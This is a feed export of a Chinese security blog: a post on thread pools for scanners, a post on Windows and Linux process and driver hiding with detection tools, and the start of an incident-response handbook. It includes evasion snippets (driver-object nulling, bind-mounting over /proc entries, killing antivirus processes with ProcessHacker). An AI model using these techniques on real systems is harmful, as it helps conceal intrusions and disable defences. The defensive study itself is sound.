
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from multiprocessing.pool import ThreadPool
 
def foo(bar, baz):
  print 'hello {0}'.format(bar)
  return 'foo' + baz
 
pool = ThreadPool(processes=1)
 
async_result = pool.apply_async(foo, ('xiaorui.cc', 'foo',))

return_val = async_result.get()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;进程池&quot;&gt;进程池&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing进程池&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注意下面代码的注释，apply_async和apply函数，前者是非阻塞的，后者是阻塞。可以看出运行时间相差的倍数正是进程池数量。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import multiprocessing
import time

def func(msg):
    print &quot;msg:&quot;, msg
    time.sleep(3)
    print &quot;end&quot;
    return &quot;done&quot; + msg

if __name__ == &quot;__main__&quot;:
    pool = multiprocessing.Pool(processes=4)
    result = []
    for i in xrange(3):
        msg = &quot;hello %d&quot; %(i)
        #result.append(pool.apply(func, (msg, )))
		result.append(pool.apply_async(func, (msg, )))
    pool.close()
    pool.join()
    for res in result:
        print &quot;:::&quot;, res.get()
    print &quot;Sub-process(es) done.&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;封装库&quot;&gt;封装库&lt;/h3&gt;

&lt;p&gt;网上还有一些通过封装多进程、多线程、队列组合成的第三方库，也能达到比较好的效果，这种库对于细节的优化较好。&lt;/p&gt;

&lt;p&gt;下面是某个第三方库的代码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding=utf-8

import threading
import Queue

from billiard.dummy import DummyProcess

class work(DummyProcess):
    def __init__(self, workQueue, result_queue, timeout=5, **kwargs):
        self.timeout = timeout
        self.result_queue = result_queue
        self.isRunning = False
        self.workQueue = workQueue
        DummyProcess.__init__(self, kwargs=kwargs)


    def stop(self):
        self.isRunning = False

    def run(self):
        self.isRunning = True
        while self.isRunning:
            try:
                func, args, kwargs = self.workQueue.get(timeout=self.timeout)
                result = apply(func, *args, **kwargs)
                self.workQueue.task_done()
                self.result_queue.put(result, False)
            except Queue.Empty:
                self.isRunning = False
            except:
                pass

class ThreadPool:
    def __init__(self, num_of_threads=10):
        self.workQueue = Queue.Queue()
        self.result_queue = Queue.Queue()
        self.threads = []

        for i in range(num_of_threads):
            thread = work(self.workQueue, self.result_queue)
            self.threads.append(thread)

    def add_job(self, fun, *args, **kwargs):
        self.workQueue.put((fun, args, kwargs))
    
    def get_result(self):
        results = []
        try:
            while True:
                result = self.result_queue.get(block=False)
                results.append(result)
        except Exception,e:
            print str(e)
        finally:
            return results

    def start(self):
        try:
            for t in self.threads:
                t.start()
        except:
            self.stop()

    def stop(self):
        for t in self.threads:
            t.stop()

    def wait_for_complete(self):
        try:
            for t in self.threads:
                while t.isAlive():
                    t.join(10)

        except KeyboardInterrupt:
            self.stop()
            print


if __name__ == &quot;__main__&quot;:
    tp = ThreadPool(20)
    for line in open('target.txt').readlines():
        evil = Evil_Class(line)
        tp.add_job(evil.run)
    tp.start()
    try:
        tp.wait_for_complete()
        resp = tp.get_result()
    except KeyboardInterrupt:
        tp.stop()


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;分布式任务&quot;&gt;分布式任务&lt;/h3&gt;

&lt;p&gt;对于分布式任务的话，配置起来会比较麻烦。比如你就一台PC或者破VPS，还想搞多节点分布式任务，显然吃饱了撑着没事干。&lt;/p&gt;

&lt;p&gt;分布式的优点的话，主要在于其可扩展性，理论上只要消息中间件和容错机制足够稳健，带宽足够高，就能最大化提升扫描器的性能。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;celery&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;celery是一个国外的分布式调度框架，在扫描器方面，我们可以采用几种方案：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;单机器 + 多节点 + 线/进程池&lt;/li&gt;
    &lt;li&gt;多机器 + 多节点 + 线/进程池&lt;/li&gt;
    &lt;li&gt;多机器 + 多节点&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;前两条对扫描器性能提升确实是有的，但如果个别网络任务如果耗时较长的话，会持续占用进而耗尽节点的资源。
即使每条任务里，我们都会尽可能提升进程/线程数，但如果其中仍然包含有多级网络任务调用，那么扫描的速率也不会有太大的提升。因为除了机器资源以外，扫描器还会受带宽、网卡出口等其他因素的影响。&lt;/p&gt;

&lt;p&gt;如果我们遵循第三条，最大化利用celery节点运行任务，将所有线/进程池尽可能替换，则会是另一个场景。
当每一个插件或者fuzz脚本，都作为单条任务去运行时，容错机制会及时结束掉每一个失败/超时的任务。在我们做好中间件和存储的灾备机制的前提下，扫描器将会变得更加稳健。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;bugscan&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当然，业内也有小伙伴做出了基于rpc通信的异步任务管理框架，如bugscan。&lt;/p&gt;

&lt;p&gt;其节点有三个核心：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Service: rpc client, 负责与server通信, 获取任务插件，发送报告等操作。
Task_Manager: 任务管理器, 执行添加，删除任务的操作。
Task: 获取插件，执行任务，输出报告。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其运作的大概流程，这里就直接复制别人的分析报告了：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;无限循环 -&amp;gt; service 获取任务列表 -&amp;gt; 是否有待执行的任务 -&amp;gt; 发送至 task_manager -&amp;gt; 添加任务 -&amp;gt; 调用 task -&amp;gt; task 执行任务 -&amp;gt; service 设置任务状态 -&amp;gt; 是否返回报告 -&amp;gt; service 发送报告 -&amp;gt; 是否有待停止的任务 -&amp;gt; 发送至 task_manager -&amp;gt; 删除任务 -&amp;gt; 调用 task -&amp;gt; task 停止任务 -&amp;gt; service 设置任务状态 -&amp;gt; 无限循环
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;有兴趣的朋友可以看看原文，这是关于bugscan的一篇详细分析：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.chabug.org/tools/553.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;多种其他异步任务框架&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;相似的框架还是蛮多的，就不一一列举了。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;dramatiq&lt;/li&gt;
  &lt;li&gt;sidekiq&lt;/li&gt;
  &lt;li&gt;huey&lt;/li&gt;
  &lt;li&gt;thriftpy&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;总而言之，只要我们合理利用可以加速的库，可以更好地打造我们的扫描器。本文聊的内容比较基础，接下来的文章里，笔者打算通过细分领域，重点拿经典项目的案例进行剖析。&lt;/p&gt;

&lt;h3 id=&quot;参考文章&quot;&gt;参考文章&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/xiaozi/p/6182990.html&quot;&gt;python线程池（threadpool）模块使用笔记&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/zhang293/p/7954353.html&quot;&gt;多种方法实现 python 线程池&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://xiaorui.cc/2015/11/03/%E7%90%86%E8%A7%A3python%E7%9A%84multiprocessing-pool-threadpool%E5%A4%9A%E7%BA%BF%E7%A8%8B/&quot;&gt;理解python的multiprocessing.pool threadpool多线程&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ns2250225/article/details/48755741&quot;&gt;使用 multiprocessing.dummy 执行多线程任务&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/lxmhhy/p/6052167.html&quot;&gt;python 多进程使用总结&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/PrettyTom/p/6582357.html&quot;&gt;Python的多进程&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.chabug.org/tools/553.html&quot;&gt;[X1r0z]模拟bugscan node的通信机制及在线体验
&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。</summary></entry><entry><title type="html">浅谈进程隐藏之术</title><link href="/cert/2018/07/04/hide-process/" rel="alternate" type="text/html" title="浅谈进程隐藏之术" /><published>2018-07-04T19:30:38+08:00</published><updated>2018-07-04T19:30:38+08:00</updated><id>/cert/2018/07/04/hide-process</id><content type="html" xml:base="/cert/2018/07/04/hide-process/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;windows进程隐藏&quot;&gt;windows进程隐藏&lt;/h3&gt;

&lt;h4 id=&quot;基于系统服务的进程隐藏技术&quot;&gt;基于系统服务的进程隐藏技术&lt;/h4&gt;

&lt;p&gt;在WIN 9X系列操作系统中, 系统进程列表中不能看到任何系统服务进程, 因此只需要将指定进程注册为系统服务就能够使该进程从系统进程列表中隐形。&lt;/p&gt;

&lt;p&gt;在WIN 9X下用RegisterServiceProcess函数隐藏进程，NT架构下用不了 即win2000和xp等什么的用不了此方法。&lt;/p&gt;

&lt;p&gt;替换tasklist、ps、top
https://blog.csdn.net/qq_27446553/article/details/54591099
windows高版本内核难以进行真正的进程隐藏，除非编写底层驱动。
在进程LoadLibrary某个DLL文件后，这个DLL是不可以被删除的，但是可以改名和移动位置（当然，就算移动了位置也不可以删除它），所以代码中可以用MoveFile移动到某个角落去。
这样，DLL就从原来的位置消失了，而新位置在资源管理器中又无法访问到，达到了简单隐藏DLL的目的。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CreateDirectory('d:\test\....\', nil);
MoveFile('D:\test\Hack.dll', 'd:\test\....\Hack.dll');
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;基于api-hook的进程隐藏技术&quot;&gt;基于API HOOK的进程隐藏技术&lt;/h4&gt;

&lt;p&gt;API HOOK指的是通过特殊的编程手段截获WINDOWS系统调用的API函数,并将其丢弃或者进行替换。 通过API
HOOK编程方法,截获系统遍历进程函数并对其进行替换,可以实现对任意进程的隐藏。&lt;/p&gt;

&lt;h4 id=&quot;基于-dll-的进程隐藏技术远程注入dll技术&quot;&gt;基于 DLL 的进程隐藏技术:远程注入Dll技术&lt;/h4&gt;

&lt;p&gt;先编写一个API的DLL，将它远程注入进程，写入远程进程的内存地址空间，并建立远程线程执行。&lt;/p&gt;

&lt;p&gt;不触发PG（patchguard），又能隐藏驱动：
当驱动加载时 会将驱动信息加入那个链表，可以直接阻止这个加入的过程。
“MiProcessLoaderEntry”，这个函数将驱动信息加入链表和移除链表：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;调用MiProcessLoaderEntry(pDriverObject-&amp;gt;DriverSection, 0);
PCHunter显示为红色~

能不能完全隐藏?
pTargetDriverObject-&amp;gt;DriverSection = NULL;

// 破坏驱动对象特征
pTargetDriverObject-&amp;gt;DriverStart = NULL;
pTargetDriverObject-&amp;gt;DriverSize = NULL;
pTargetDriverObject-&amp;gt;DriverUnload = NULL;
pTargetDriverObject-&amp;gt;DriverInit = NULL;
pTargetDriverObject-&amp;gt;DeviceObject = NULL;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;基于远程线程注入代码的进程隐藏技术&quot;&gt;基于远程线程注入代码的进程隐藏技术&lt;/h4&gt;

&lt;p&gt;这种方法与远程线程注入DLL的原理一样,都是通过在某进程中创建远程线程来共享该进程的内存空间。&lt;/p&gt;

&lt;p&gt;所不同的是,远程线程注入代码通过直接拷贝程序代码到某进程的内存空间来达到注入的目的。&lt;/p&gt;

&lt;p&gt;因为程序代码存在于内存中,不仅进程列表中无法检测,即使遍历进程加载的内存模块也无法找到被隐藏程序的踪迹。&lt;/p&gt;

&lt;h4 id=&quot;rootkit方式&quot;&gt;Rootkit方式&lt;/h4&gt;

&lt;p&gt;Intel CPU 有4 个特权级别： Ring 0， Ring 1， Ring 2， Ring 3。Windows 只使用了其中的 Ring  0 和  Ring  3 两个级别。&lt;/p&gt;

&lt;p&gt;操作系统分为内核和外壳两部分：内核运行在Ring0级，通常称为核心态（或内核态），用于实现最底层的管理功能，在内核态可以访问系统数据和硬件，包括处理机调度、内存管理、设备管理、文件管理等；外壳运行在 Ring 3级，通常称为用户态，是基于内核提供的交互功能而存在的界面，它负责指令传递和解释。通常情况下，用户态的应用程序没有权限访问核心态的地址空间。&lt;/p&gt;

&lt;p&gt;Rootkit 是攻击者用来隐藏自己的踪迹和保留 root 访问权限的工具，它能使攻击者一直保持对目标机器的访问，以实施对目标计算机的控制[1]。从 Rootkit 运行的环境来看，可将
其分为用户级 Rootkit 和内核级 Rootkit。
用户态下，应用程序会调用 Win32 子系统动态库（包括Kernel32.dll， User32.dll， Gdi32.dll等）提供的Win32 API函数，它们是Windows提供给应用程序与操作系统的接口，运行在Ring3级。用户级 Rootkit 通常就是通过拦截 Win32 API，建立系统钩子，插入自己的代码，从而控制检测工具对进程或服务的遍历调用，实现隐藏功能。&lt;/p&gt;

&lt;p&gt;内核级Rootkit 是指利用驱动程序技术或其它相关技术进入Windows 操作系统内核，通过对 Windows 操作系统内核相关的数据结构或对象进行篡改，以实现隐藏功能。&lt;/p&gt;

&lt;p&gt;由于Rootkit运行在Ring0级别，甚至进入内核空间，因而可以对内核指令进行修改，而用户级检测却无法发现内核操作被拦
截。
下面介绍两种使用Rootkit技术来实现进程隐藏的方法。注册表来实现启动,因而易于被检测出来。显然,要增强进程的隐蔽性,关键在于增强加载程序文件的隐藏性。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;SSDT Hook&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;参考资料：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;进程隐藏与进程保护（SSDT Hook 实现）（一）
http://www.cnblogs.com/zmlctt/p/3979105.html

进程隐藏与进程保护（SSDT Hook 实现）（二）
https://www.cnblogs.com/zmlctt/p/3979108.html

进程隐藏与进程保护（SSDT Hook 实现）（三）
http://www.cnblogs.com/BoyXiao/archive/2011/09/05/2168115.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;DKOM（Direct Kernel Object Manipulation，直接内核对象操作）&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;使用DKOM方法进行进程隐藏。在Windows操作系统中，系统会为每一个活动进程创建一个进程对象EPROCESS，为进程中的每一个线程创建一个线程对象 ETHREAD。

在 EPROCESS 进程结构中有个双向链表 LIST_ENTRY，LIST_ENTRY结构中有FLINK 和BLINK 两个成员指针，分别指向当前进程的前驱进程和后继进程。

如果要隐藏当前进程，只需把当前进程的前驱进程的BLINK 修改为当前进程的BLINK，再把当前进程的后继进程的FLINK修改为当前进程的FLINK。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;关于断链隐藏进程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Windows系统中的所有进程通过其ActiveProcessLinks结构中的指针来引用。它们构成了诸如taskmgr.exe（任务管理器）或某些SysInternals（例如procexp.exe）等工具使用的双链表。&lt;/p&gt;

&lt;p&gt;DKOM技术【直接内核对象操纵（Direct Kernel Object Manipulation）】隐藏了一个取消链接它自己的ActiveProcessLinks的进程，并将“前一个”和“下一个”进程直接相互链接。
事实上，许多监控/系统工具（例如SysInternals Microsoft套件）都是基于双链表的进程枚举。&lt;/p&gt;

&lt;p&gt;不过断链隐藏进程，容易蓝屏，貌似也过不了pg。&lt;/p&gt;

&lt;h3 id=&quot;linux进程隐藏&quot;&gt;Linux进程隐藏&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;一种简单的方法：系统启动时会依据 /etc/fstab 文件内容来挂载分区，在 proc 分区挂载参数中加入 hidepid=2 参数后，登陆系统的用户只能查看到当前用户启动的进程的信息。也就是说， tomcat 用户只能看到属于 tomcat 用户进程的信息。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在内核中新增两个信号，当进程向内核发出 hide 信号时，内核将不会为该进程在 /proc 目录下生成对应的目录，从而也就从底层铲除了进程的信息，即使黑客获得了 root 权限也无法通过常规手段察觉到蛛丝马迹。除此之外，新增的unhide信号作用恰好与 hide 信号相反。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对其他用户隐藏&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果你使用的linux kernel(内核)是3.2以上的版本(或者使用的RHEL/CentOS是6.5以上的版本)，你就可以对其他用户隐藏进程。
只有root用户可以看到所有的进程，而非root用户，只能看到属于自己的进程信息。你所需要做的仅仅是开启linux kernel加固选项 “hidepid “来重新挂载 /proc文件系统。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.jb51.net/LINUXjishu/347787.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;linux下根据进程名称隐藏进程的PID&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;把要隐藏的进程PID设置为0，因为系统默认是不显示PID为0的进程，不过缺陷比较大。
其核心思想就是把task-&amp;gt;pid变成0，就成了0号进程。而在ps，top命令中，是不显示0号进程的相关信息。这么一来，在/proc/文件夹下就不会有该进程的相关信息了。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改系统调用sys_getdents（）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://blog.chinaunix.net/uid-26585427-id-5077452.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;另外，还有一种比较简便的方法，就是把int main(int argc, char*argv[])中的参数变成0，那么就在单纯的ps命令中就不会显示进程相关信息，但是/proc/文件夹下，还会存在该进程的相关信息。&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://blog.csdn.net/xqhrs232/article/details/51906206
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;遍历PspCidTable表检测隐藏进程&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.cnblogs.com/kuangke/p/5761615.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;部分补充说明&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在变更文件里可以看到一些挖矿程序，同时 /etc/ld.so.preload 文件的变更需要引起注意，这里涉及到 Linux 动态链接库预加载机制，是一种常用的进程隐藏方法，而 top 等命令都是受这个机制影响的。&lt;/p&gt;

&lt;p&gt;可以看看其中有没有包含可疑的so文件，然后记录后去掉。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;注意
/etc/rc.d/init.d/network
/etc/resolv.conf

cat /etc/ld.so.preload
top 查看pid
ls  -lh /proc/pid号
得到相关文件位置后进行清理
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;隐藏进程，会出现proc下面大小异常：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /pro/$$/mountinfo 
cat /proc/mounts 
mount
以上三个等价，可靠性不同。

$$ 表示当前shell进程的进程ID

#处理后可以瞒过直接mount
cp /etc/mtab .
mount –bind /bin /proc/[pid]
mv . /etc/mtab

#这样可以进行隐藏
mount –bind /tmp/empty /proc/2694
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;windows工具检查&quot;&gt;Windows工具检查&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Winpmem内存转储【配合Volatility进行内存取证】&lt;/li&gt;
  &lt;li&gt;冰刃&lt;/li&gt;
  &lt;li&gt;process explorer&lt;/li&gt;
  &lt;li&gt;Filemon：查看进程和文件对应&lt;/li&gt;
  &lt;li&gt;Regmon：查看进程和注册表对应&lt;/li&gt;
  &lt;li&gt;PC Hunter(xuetr) 可查看硬盘上隐藏的文件&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;手动杀进程&quot;&gt;手动杀进程&lt;/h4&gt;

&lt;p&gt;非常古老的pskill&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pskill $PID
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;可以用它结束一些常见的杀毒软件进程，使用方法如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\&amp;gt; ProcessHacker.exe -c -ctype process -cobject $PID-Number -caction terminate
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;也是暂停进程的运行，如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\&amp;gt; ProcessHacker.exe -c -ctype process -cobject $PID-Number –caction suspend
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;wmic：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmic process where caption=&quot;qq.exe&quot; delete
wmic process where handle=10000 delete
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;TASKKILL：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TASKKILL /S system /F /IM notepad.exe /T
TASKKILL /PID 1230 /PID 1241 /PID 1253 /T
TASKKILL /F /IM QQ.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;ntsd：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntsd -c q -p pid
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux下工具检查&quot;&gt;Linux下工具检查：&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;暴力枚举进程
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;通过PsLookupProcessByProcessId获得EPROCESS
通过ZwQuerySystemInformation
通过进程活动连来枚举
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;hkrookit&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;rkhunter&lt;/p&gt;

    &lt;p&gt;具体用法，请查看：&lt;a href=&quot;/pentest/2018/06/25/security-emergency/&quot;&gt;《信安应急响应手册
》&lt;/a&gt;。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;偶然发现的小工具&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可检测通过Hook vfs 函数来隐藏的进程。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://security.tencent.com/index.php/opensource/detail/16
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Volatility：
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pslist – 通过检查双链表来检测进程
pstree – 使用了相同技术，只是显示有小小的差别
psscan – 在内存中扫描_POOL_HEADER结构（内存页池）以识别相关进程
psxview – 几种技术的组合：
pslist：如上所述
psscan：如上所述
thrdproc：线程扫描，检索调度程序使用的_KTHREAD列表（不能在不中断进程执行的情况下修改它），然后搜索相关的_EPROCESS对象。
pspcid
csrss：csrss.exe进程保留着可以在其内存中检索到的进程的独立列表。
session
deskthrd
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;尾声&quot;&gt;尾声&lt;/h3&gt;

&lt;p&gt;需要强调的是，攻防都是相对的，技术是在进步的，工具需要配合手工才能变成神器。&lt;/p&gt;

&lt;p&gt;以后在实践中遇到新东西，或者在其他资料站看到实用的内容，后面会继续给大家更新。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="cert" /><summary type="html">前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。</summary></entry><entry><title type="html">信安应急响应手册</title><link href="/pentest/2018/06/25/security-emergency/" rel="alternate" type="text/html" title="信安应急响应手册" /><published>2018-06-25T12:56:18+08:00</published><updated>2018-06-25T12:56:18+08:00</updated><id>/pentest/2018/06/25/security-emergency</id><content type="html" xml:base="/pentest/2018/06/25/security-emergency/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;应急工具包&quot;&gt;应急工具包&lt;/h3&gt;

&lt;h4 id=&quot;tools-for-windows&quot;&gt;Tools for windows&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Logparser&lt;/li&gt;
  &lt;li&gt;wireshark&lt;/li&gt;
  &lt;li&gt;WSExplorer&lt;/li&gt;
  &lt;li&gt;冰刃&lt;/li&gt;
  &lt;li&gt;process explorer&lt;/li&gt;
  &lt;li&gt;winsyscheck&lt;/li&gt;
  &lt;li&gt;PC Hunter(xuetr) 可查看硬盘上隐藏的文件&lt;/li&gt;
  &lt;li&gt;D盾/360网站卫士/安全狗&lt;/li&gt;
  &lt;li&gt;Filemon：查看进程和文件对应&lt;/li&gt;
  &lt;li&gt;Regmon：查看进程和注册表对应&lt;/li&gt;
  &lt;li&gt;Rootkit Unhooker：Hook检测&lt;/li&gt;
  &lt;li&gt;Rootkit Revelaer：rootkit检测&lt;/li&gt;
  &lt;li&gt;LP_Check工具检查: 找出影子管理员和克隆账号&lt;/li&gt;
  &lt;li&gt;Autoruns工具： 查看启动项&lt;/li&gt;
  &lt;li&gt;bitsadmin /list/allusers/verbose【好像不大好使】&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;tools-for-linux&quot;&gt;Tools for linux&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;chkrookit&lt;/li&gt;
  &lt;li&gt;rkhunter&lt;/li&gt;
  &lt;li&gt;tshark&lt;/li&gt;
  &lt;li&gt;shellpub(河马)&lt;/li&gt;
  &lt;li&gt;Auditd【linux自带审计】&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;简单用法：&lt;/p&gt;

&lt;p&gt;1、chkrootkit&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;下载：wget –c ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
编译：tar xvzf chkrootkit.tar.gz
make sense
开始检测：./chkrootkit -q
如果出现INFECTED，说明检测出系统后门
可以直接使用./chkrootkit -q | grep INFECTED命令检测并筛选出存在INFECTED的内容
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2、Rootkit Hunter&lt;/p&gt;

